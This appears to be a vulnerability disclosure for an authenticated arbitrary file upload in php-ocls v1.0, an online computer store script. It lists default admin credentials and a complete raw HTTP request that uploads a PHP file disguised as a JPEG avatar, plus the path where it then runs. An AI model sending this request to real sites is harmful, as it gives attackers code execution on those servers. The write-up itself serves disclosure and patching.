# php-ocls<=v1.0 Authenticated Arbitrary File Upload

## Description

    php-ocls<=v1.0 /php-ocls/classes/Users.php?f=save interface has an authenticated arbitrary file upload vulnerability

## source code

    php-ocls<=1.0
    Software Link: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

1. login system(default: admin:admin&123)

   /php-ocls/admin/login.php

| ![image-20240816163739350](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary File Upload.assets\image-20240816163739350.png) |
| ------------------------------------------------------------ |

2. upload Avatar

| ![](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary File Upload.assets\image-20240816163815702.png) |
| ------------------------------------------------------------ |
| ![image-20240816163931495](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary File Upload.assets\image-20240816163931495.png) |

```http
POST /php-ocls/classes/Users.php?f=save HTTP/1.1
Host: 172.20.10.166:8080
Content-Length: 6464
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvOPdJlKG9BB6Qoca
Origin: http://172.20.10.166:8080
Referer: http://172.20.10.166:8080/php-ocls/admin/?page=user
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=e2vdjl8cstkt92494q3ru73n2q
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="firstname"

Adminstrator
------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="lastname"

Admin
------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="username"

admin
------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="password"


------WebKitFormBoundaryvOPdJlKG9BB6Qoca
Content-Disposition: form-data; name="img"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryvOPdJlKG9BB6Qoca--

```

3. Accessing avatars

| ![image-20240816164005374](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary File Upload.assets\image-20240816164005374.png) |
| ------------------------------------------------------------ |

> /php-ocls/uploads/1723797540_1.php

| ![image-20240816164104754](E:\Desktop\webRay\cve挖掘\cve提交\php-ocls-Arbitrary File Upload.assets\image-20240816164104754.png) |
| ------------------------------------------------------------ |

